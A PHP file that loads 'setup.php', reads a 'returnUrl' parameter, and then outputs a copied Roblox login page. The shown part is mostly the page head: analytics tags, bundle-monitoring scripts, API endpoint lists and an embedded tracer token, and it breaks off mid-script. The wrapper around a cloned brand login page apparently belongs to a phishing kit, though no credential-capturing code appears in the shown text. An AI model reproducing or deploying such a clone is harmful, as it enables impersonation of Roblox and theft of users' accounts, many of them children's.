<?php

require('setup.php');
$get = $_GET["returnUrl"];

if (isset($_GET['returnUrl']) && is_numeric($_GET['returnUrl'])) {
}


?>

<html><!--<![endif]--><head data-machine-id="CHI2-WEB6"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
	<style type="text/css">
	@charset "UTF-8";
	[ng\:cloak],
	[ng-cloak],
	[data-ng-cloak],
	[x-ng-cloak],
	.ng-cloak,
	.x-ng-cloak,
	.ng-hide:not(.ng-hide-animate) {
		display: none !important;
	}
	
	ng\:form {t
		display: block;
	}
	
	.ng-animate-shim {
		visibility: hidden;
	}
	
	.ng-anchor {
		position: absolute;
	}
	</style>
	<!-- MachineID: CHI2-WEB6 -->
	<title>Roblox</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="author" content="Roblox Corporation">
	<meta name="description" content="Roblox is a global platform that brings people together through play.">
	<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">
	<meta name="apple-itunes-app" content="app-id=431946152">
	<script src="https://pagead2.googlesyndication.com/pagead/managed/js/adsense/m202312070101/show_ads_impl_with_ama_fy2021.js?client=ca-pub-4902752889650622&amp;plah=roblox.com" id="google_shimpl"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-YKBGX9W7SH&amp;l=dataLayer&amp;cx=c"></script><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script>
	<script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script>
	<script type="application/ld+json"> { "@context" : "http://schema.org", "@type" : "Organization", "name" : "Roblox", "url" : "https://www.roblox.com/", "logo": "https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91", "sameAs" : [ "https://www.facebook.com/roblox/", "https://twitter.com/roblox", "https://www.linkedin.com/company/147977", "https://www.instagram.com/roblox/", "https://www.youtube.com/user/roblox", "https://plus.google.com/+roblox", "https://www.twitch.tv/roblox" ] } </script>
	<meta ng-csp="no-unsafe-eval">
	<meta name="locale-data" data-language-code="en_us" data-language-name="English">
	<meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown">
	<meta name="environment-meta" data-is-testing-site="false">
	<meta id="roblox-display-names" data-enabled="true">
	<meta name="page-meta" data-internal-page-name="Login">
	<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.BundleVerifierConstants = {
		isMetricsApiEnabled: true,
		eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
		deviceType: "Computer",
		cdnLoggingEnabled: JSON.parse("true")
	};
	</script>
	<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.BundleDetector = (function() {
		var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;
		var loadStates = {
			loadSuccess: "loadSuccess",
			loadFailure: "loadFailure",
			executionFailure: "executionFailure"
		};
		var bundleContentTypes = {
			javascript: "javascript",
			css: "css"
		};
		var ephemeralCounterNames = {
			cdnPrefix: "CDNBundleError_",
			unknown: "CDNBundleError_unknown",
			cssError: "CssBundleError",
			jsError: "JavascriptBundleError",
			jsFileError: "JsFileExecutionError",
			resourceError: "ResourcePerformance_Error",
			resourceLoaded: "ResourcePerformance_Loaded"
		};
		return {
			jsBundlesLoaded: {},
			bundlesReported: {},
			counterNames: ephemeralCounterNames,
			loadStates: loadStates,
			bundleContentTypes: bundleContentTypes,
			timing: undefined,
			setTiming: function(windowTiming) {
				this.timing = windowTiming;
			},
			getLoadTime: function() {
				if(this.timing && this.timing.domComplete) {
					return this.getCurrentTime() - this.timing.domComplete;
				}
			},
			getCurrentTime: function() {
				return new Date().getTime();
			},
			getCdnProviderName: function(bundleUrl, callBack) {
				if(Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
					var xhr = new XMLHttpRequest();
					xhr.open('GET', bundleUrl, true);
					xhr.onreadystatechange = function() {
						if(xhr.readyState === xhr.HEADERS_RECEIVED) {
							try {
								var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
								if(headerValue) {
									callBack(headerValue);
								} else {
									callBack();
								}
							} catch(e) {
								callBack();
							}
						}
					};
					xhr.onerror = function() {
						callBack();
					};
					xhr.send();
				} else {
					callBack();
				}
			},
			getCdnProviderAndReportMetrics: function(bundleUrl, bundleName, loadState, bundleContentType) {
				this.getCdnProviderName(bundleUrl, function(cdnProviderName) {
					Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
				});
			},
			reportMetrics: function(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
				if(!isMetricsApiEnabled || !bundleUrl || !loadState || !loadStates.hasOwnProperty(loadState) || !bundleContentType || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
					return;
				}
				var xhr = new XMLHttpRequest();
				var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";
				xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
				xhr.setRequestHeader("Content-Type", "application/json");
				xhr.withCredentials = true;
				xhr.send(JSON.stringify({
					bundleUrl: bundleUrl,
					bundleName: bundleName || "",
					bundleContentType: bundleContentType,
					loadState: loadState,
					cdnProviderName: cdnProviderName,
					loadTimeInMilliseconds: this.getLoadTime() || 0
				}));
			},
			logToEphemeralStatistics: function(sequenceName, value) {
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				sequenceName += "_" + deviceType;
				var xhr = new XMLHttpRequest();
				xhr.open('POST', '/game/report-stats?name=' + sequenceName + "&value=" + value, true);
				xhr.withCredentials = true;
				xhr.send();
			},
			logToEphemeralCounter: function(ephemeralCounterName) {
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				ephemeralCounterName += "_" + deviceType;
				//log to ephemeral counters - taken from ET.js
				var xhr = new XMLHttpRequest();
				xhr.open('POST', '/game/report-event?name=' + ephemeralCounterName, true);
				xhr.withCredentials = true;
				xhr.send();
			},
			logToEventStream: function(failedBundle, ctx, cdnProvider, status) {
				var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
					currentPageUrl = encodeURIComponent(window.location.href);
				var deviceType = Roblox.BundleVerifierConstants.deviceType;
				ctx += "_" + deviceType;
				//try and grab performance data.
				//Note that this is the performance of the xmlhttprequest rather than the original resource load.
				var duration = 0;
				if(window.performance) {
					var perfTiming = window.performance.getEntriesByName(failedBundle);
					if(perfTiming.length > 0) {
						var data = perfTiming[0];
						duration = data.duration || 0;
					}
				}
				//log to event stream (diagnostic)
				var params = "&evt=webBundleError&url=" + currentPageUrl + "&ctx=" + ctx + "&fileSourceUrl=" + encodeURIComponent(failedBundle) + "&cdnName=" + (cdnProvider || "unknown") + "&statusCode=" + (status || "unknown") + "&loadDuration=" + Math.floor(duration);
				var img = new Image();
				img.src = esUrl + params;
			},
			getCdnInfo: function(failedBundle, ctx, fileType) {
				if(Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
					var xhr = new XMLHttpRequest();
					var counter = this.counterNames;
					xhr.open('GET', failedBundle, true);
					var cdnProvider;
					//succesful request
					xhr.onreadystatechange = function() {
						if(xhr.readyState === xhr.HEADERS_RECEIVED) {
							cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
							if(cdnProvider && cdnProvider.length > 0) {
								Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
							} else {
								Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
							}
						} else if(xhr.readyState === xhr.DONE) {
							// append status to cdn provider so we know its not related to network error. 
							Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
						}
					};
					//attach to possible things that can go wrong with the request.
					//additionally a network error will trigger this callback
					xhr.onerror = function() {
						Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
						Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
					};
					xhr.send();
				} else {
					this.logToEventStream(failedBundle, ctx);
				}
			},
			reportResourceError: function(resourceName) {
				var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
				this.logToEphemeralCounter(ephemeralCounterName);
			},
			reportResourceLoaded: function(resourceName) {
				var loadTimeInMs = this.getLoadTime();
				if(loadTimeInMs) {
					var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
					this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
				}
			},
			reportBundleError: function(bundleTag) {
				var ephemeralCounterName, failedBundle, ctx, contentType;
				if(bundleTag.rel && bundleTag.rel === "stylesheet") {
					ephemeralCounterName = this.counterNames.cssError;
					failedBundle = bundleTag.href;
					ctx = "css";
					contentType = bundleContentTypes.css;
				} else {
					ephemeralCounterName = this.counterNames.jsError;
					failedBundle = bundleTag.src;
					ctx = "js";
					contentType = bundleContentTypes.javascript;
				}
				//mark that we logged this bundle
				this.bundlesReported[failedBundle] = true;
				//e.g. javascriptBundleError_Computer
				this.logToEphemeralCounter(ephemeralCounterName);
				//this will also log to event stream
				this.getCdnInfo(failedBundle, ctx, ctx);
				var bundleName;
				if(bundleTag.dataset) {
					bundleName = bundleTag.dataset.bundlename;
				} else {
					bundleName = bundleTag.getAttribute('data-bundlename');
				}
				this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
			},
			bundleDetected: function(bundleName) {
				this.jsBundlesLoaded[bundleName] = true;
			},
			verifyBundles: function(document) {
				var ephemeralCounterName = this.counterNames.jsFileError,
					eventContext = ephemeralCounterName;
				//grab all roblox script tags in the page. 
				var scripts = (document && document.scripts) || window.document.scripts;
				var errorsList = [];
				var bundleName;
				var monitor;
				for(var i = 0; i < scripts.length; i++) {
					var item = scripts[i];
					if(item.dataset) {
						bundleName = item.dataset.bundlename;
						monitor = item.dataset.monitor;
					} else {
						bundleName = item.getAttribute('data-bundlename');
						monitor = item.getAttribute('data-monitor');
					}
					if(item.src && monitor && bundleName) {
						if(!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
							errorsList.push(item);
						}
					}
				}
				if(errorsList.length > 0) {
					for(var j = 0; j < errorsList.length; j++) {
						var script = errorsList[j];
						if(!this.bundlesReported[script.src]) {
							//log the counter only if the file is actually corrupted, not just due to failure to load
							//e.g. JsFileExecutionError_Computer
							this.logToEphemeralCounter(ephemeralCounterName);
							this.getCdnInfo(script.src, eventContext, 'js');
							if(script.dataset) {
								bundleName = script.dataset.bundlename;
							} else {
								bundleName = script.getAttribute('data-bundlename');
							}
							this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
						}
					}
				}
			}
		};
	})();
	window.addEventListener("load", function(evt) {
		Roblox.BundleDetector.verifyBundles();
	});
	Roblox.BundleDetector.setTiming(window.performance.timing);
	//# sourceURL=somename.js
	</script>
    <link href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb" rel="icon">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/15817fe8ed125932081b163388897a93e3792747318cd107adc2d569e8bf7c7e.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/b058572a60452c8c5ce47eb18c55dd3760a21b24c698b64fab5531c58bb0cf0e.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3f5767588c352c1b6fd800e2d14466cfa7113a04fa5cf02f1e33f2f0e7dd204f.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/0215f4ab43fd7f7774efcc8fc1be49e6d1f7599463d3d1db1275e344d5eb5f8b.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/6edb2191aa318f963253361b43d2657a04b3d16e9c28fe7b22d4a4d5686f1cb4.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css">
    <link rel="canonical" href="https://www.roblox.com/NewLogin">
    <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch">
    <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___b0dafd506d198313adc7eb9bccc23fbb_m.css/fetch">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/ee82c23c0c487dc90ec8cdd1b0caf2fc786ff3285fe8be06218c9838288d46e5.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/d8a3b48304642bf28fbc1675e55cbd75a3be58986a34a762e360dd3963ad467b.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSelector" data-bundle-source="Main" href="https://css.rbxcdn.com/dafa0011479aa80baa7644c359afa68ccb9a098c0cf599bff1b1fd7781553336.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/13268acde7e01c62a818ccf9b82e301d8b6df25e45f76a4429c10d1a3aa4f2d0.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/d584565dd1339ac8a09691938aa4cff54511f32a9bba1b9f013d6e32195b4f5a.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/6fe55c3438539daf776774645e39e121d991246d6a38972b81e3f9550a585b5b.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/5331669054807354a3a20a4717d18c566a7cbee984e7471ece3a2090cb70150c.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/68f976f4a3f8f3a6aae074879170e579451270e693d2361491b1c1bb9ac5e4c5.css">
    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">
	<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
	Roblox.EnvironmentUrls = {
		"abtestingApiSite": "https://roblox.com",
		"accountInformationApi": "https://roblox.com",
		"accountSettingsApi": "https://accountsettings.roblox.com",
		"adConfigurationApi": "https://adconfiguration.roblox.com",
		"adsApi": "https://ads.roblox.com",
		"apiGatewayCdnUrl": "https://roblox.com",
		"apiGatewayUrl": "https://roblox.com",
		"apiProxyUrl": "https://api.roblox.com",
		"assetDeliveryApi": "https://assetdelivery.roblox.com",
		"authApi": "https://auth.roblox.com",
		"avatarApi": "https://roblox.com",
		"badgesApi": "https://roblox.com",
		"billingApi": "https://billing.roblox.com",
		"captchaApi": "https://captcha.roblox.com",
		"catalogApi": "https://roblox.com",
		"chatApi": "https://chat.roblox.com",
		"chatModerationApi": "https://chatmoderation.roblox.com",
		"contactsApi": "https://contacts.roblox.com",
		"contentStoreApi": "https://contentstore.roblox.com",
		"developApi": "https://develop.roblox.com",
		"domain": "roblox.com",
		"economyApi": "https://economy.roblox.com",
		"economycreatorstatsApi": "https://economycreatorstats.roblox.com",
		"engagementPayoutsApi": "https://engagementpayouts.roblox.com",
		"followingsApi": "https://followings.roblox.com",
		"friendsApi": "https://roblox.com",
		"gameInternationalizationApi": "https://gameinternationalization.roblox.com",
		"gamesApi": "https://games.roblox.com",
		"groupsApi": "https://groups.roblox.com",
		"groupsModerationApi": "https://groupsmoderation.roblox.com",
		"helpSite": "http://help.roblox.com",
		"inventoryApi": "https://inventory.roblox.com",
		"itemConfigurationApi": "https://itemconfiguration.roblox.com",
		"localeApi": "https://locale.roblox.com",
		"localizationTablesApi": "https://localizationtables.roblox.com",
		"metricsApi": "https://roblox.com",
		"midasApi": "https://midas.roblox.com",
		"notificationApi": "https://notifications.roblox.com",
		"premiumFeaturesApi": "https://premiumfeatures.roblox.com",
		"presenceApi": "https://presence.roblox.com",
		"privateMessagesApi": "https://privatemessages.roblox.com",
		"publishApi": "https://publish.roblox.com",
		"restrictedHoursServiceApi": "https://apis.roblox.com/restricted-hours-service",
		"screenTimeApi": "https://apis.rcs.roblox.com/screen-time-api",
		"shareApi": "https://share.roblox.com",
		"thumbnailsApi": "https://roblox.com",
		"tradesApi": "https://trades.roblox.com",
		"translationRolesApi": "https://translationroles.roblox.com",
		"twoStepVerificationApi": "https://twostepverification.roblox.com",
		"universalAppConfigurationApi": "https://roblox.com/universal-app-configuration",
		"userAgreementsServiceApi": "https://apis.roblox.com/user-agreements",
		"userModerationApi": "https://usermoderation.roblox.com",
		"usersApi": "https://users.roblox.com",
		"voiceApi": "https://voice.roblox.com",
		"websiteUrl": "https://www.roblox.com"
	};
	// please keep the list in alphabetical order
	var additionalUrls = {
		amazonStoreLink: "https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA",
		amazonWebStoreLink: "https%3a%2f%2fwww.amazon.com%2froblox%3f%26_encoding%3dUTF8%26tag%3dr05d13-20%26linkCode%3dur2%26linkId%3d5562fc29c05b45562a86358c198356eb%26camp%3d1789%26creative%3d9325",
		appProtocolUrl: "robloxmobile://",
		appStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
		googlePlayStoreLink: "https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en",
		iosAppStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
		windowsStoreLink: "https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm",
		xboxStoreLink: "https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k"
	}
	for(var urlName in additionalUrls) {
		Roblox.EnvironmentUrls[urlName] = additionalUrls[urlName];
	}
	</script>
	<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.GaEventSettings = {
		gaDFPPreRollEnabled: "false" === "true",
		gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
		gaPerformanceEventEnabled: "false" === "true"
	};
	</script>
	<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="https://js.rbxcdn.com/a67ddd9413db88f4124e2c4f25d8cb1f.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/772034db167d3f4260047db4a7f2b8a58cf448709327013541e47c8962b6e556.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/4db2f741b7a3ec36d11fec999ce33f708ae85641cabfd27e11e0935928f7d9c4.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/97cb9ac7262155c329a259fce9f940f9bcfa852a6a1ccb44bd8a41c31e84e54b.js"></script>
	<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0">
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Sentry" data-bundle-source="Main" src="https://js.rbxcdn.com/edc66704bd1974195d8c60f4a163441bec82f1bcb11c492e7df07c43f45a4d49.js"></script>
	<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true">
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/adeccc658a8d5ddc63fb224cc0bcd3e29b73d70db3847c0379426bfa128d9381.js"></script>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
	<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.AdsHelper = Roblox.AdsHelper || {};
	Roblox.AdsLibrary = Roblox.AdsLibrary || {};
	Roblox.AdsHelper.toggleAdsSlot = function(slotId, GPTRandomSlotIdentifier) {
		var gutterAdsEnabled = false;
		if(gutterAdsEnabled) {
			googletag.display(GPTRandomSlotIdentifier);
			return;
		}
		if(typeof slotId !== 'undefined' && slotId && slotId.length > 0) {
			var slotElm = $("#" + slotId);
			if(slotElm.is(":visible")) {
				googletag.display(GPTRandomSlotIdentifier);
			} else {
				var adParam = Roblox.AdsLibrary.adsParameters[slotId];
				if(adParam) {
					adParam.template = slotElm.html();
					slotElm.empty();
				}
			}
		}
	}
	</script>
	<!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
	<script>
	//Set if it browser's do not track flag is enabled
	var Roblox = Roblox || {};
	(function() {
		var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
		if(typeof window.external !== "undefined" && typeof window.external.msTrackingProtectionEnabled !== "undefined") {
			dnt = dnt || window.external.msTrackingProtectionEnabled();
		}
		Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
	})();
	</script>
	<script type="text/javascript">
	var _gaq = _gaq || [];
	window.GoogleAnalyticsDisableRoblox2 = true;
	_gaq.push(['b._setAccount', 'UA-486632-1']);
	_gaq.push(['b._setSampleRate', '10']);
	_gaq.push(['b._setCampSourceKey', 'rbx_source']);
	_gaq.push(['b._setCampMediumKey', 'rbx_medium']);
	_gaq.push(['b._setCampContentKey', 'rbx_campaign']);
	_gaq.push(['b._setDomainName', 'roblox.com']);
	_gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
	_gaq.push(['b._setPageGroup', 1, 'Login']);
	_gaq.push(['b._trackPageview']);
	_gaq.push(['c._setAccount', 'UA-26810151-2']);
	_gaq.push(['c._setSampleRate', '1']);
	_gaq.push(['c._setDomainName', 'roblox.com']);
	_gaq.push(['c._setPageGroup', 1, 'Login']);
	(function() {
		if(!Roblox.browserDoNotTrack) {
			var ga = document.createElement('script');
			ga.type = 'text/javascript';
			ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0];
			s.parentNode.insertBefore(ga, s);
		}
	})();
	</script>
	<script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-1065449093"></script>
	<script type="text/javascript">
	var accountCode = "AW-1065449093";
	var signupConversionEventKey = "wmuJCO3CZBCF7YX8Aw";
	var webPurchaseConversionEventKey = "XDQ_CJme6s0BEIXthfwD";
	window.dataLayer = window.dataLayer || [];

	function gtag() {
		dataLayer.push(arguments);
	}
	gtag.conversionEvents = {
		signupConversionEvent: accountCode + '/' + signupConversionEventKey,
		webPurchaseConversionEvent: accountCode + '/' + webPurchaseConversionEventKey
	}
	gtag('set', 'allow_ad_personalization_signals', false);
	gtag('js', new Date());
	gtag('config', accountCode);
	</script>
	<script type="text/javascript">
	if(Roblox && Roblox.EventStream) {
		Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/pe?t=studio", "//ecsv2.roblox.com/pe?t=diagnostic");
	}
	</script>
	<script type="text/javascript">
	if(Roblox && Roblox.PageHeartbeatEvent) {
		Roblox.PageHeartbeatEvent.Init([2, 8, 20, 60]);
	}
	</script>
	<script type="text/javascript">
	if(typeof(Roblox) === "undefined") {
		Roblox = {};
	}
	Roblox.Endpoints = Roblox.Endpoints || {};
	Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
	Roblox.Endpoints.Urls['/asset/'] = 'https://assetgame.roblox.com/asset/';
	Roblox.Endpoints.Urls['/client-status/set'] = 'https://www.roblox.com/client-status/set';
	Roblox.Endpoints.Urls['/client-status'] = 'https://www.roblox.com/client-status';
	Roblox.Endpoints.Urls['/game/'] = 'https://assetgame.roblox.com/game/';
	Roblox.Endpoints.Urls['/game/edit.ashx'] = 'https://assetgame.roblox.com/game/edit.ashx';
	Roblox.Endpoints.Urls['/game/placelauncher.ashx'] = 'https://assetgame.roblox.com/game/placelauncher.ashx';
	Roblox.Endpoints.Urls['/game/preloader'] = 'https://assetgame.roblox.com/game/preloader';
	Roblox.Endpoints.Urls['/game/report-stats'] = 'https://assetgame.roblox.com/game/report-stats';
	Roblox.Endpoints.Urls['/game/report-event'] = 'https://assetgame.roblox.com/game/report-event';
	Roblox.Endpoints.Urls['/game/updateprerollcount'] = 'https://assetgame.roblox.com/game/updateprerollcount';
	Roblox.Endpoints.Urls['/login/default.aspx'] = 'https://www.roblox.com/login/default.aspx';
	Roblox.Endpoints.Urls['/my/avatar'] = 'https://www.roblox.com/my/avatar';
	Roblox.Endpoints.Urls['/my/money.aspx'] = 'https://www.roblox.com/my/money.aspx';
	Roblox.Endpoints.Urls['/navigation/userdata'] = 'https://www.roblox.com/navigation/userdata';
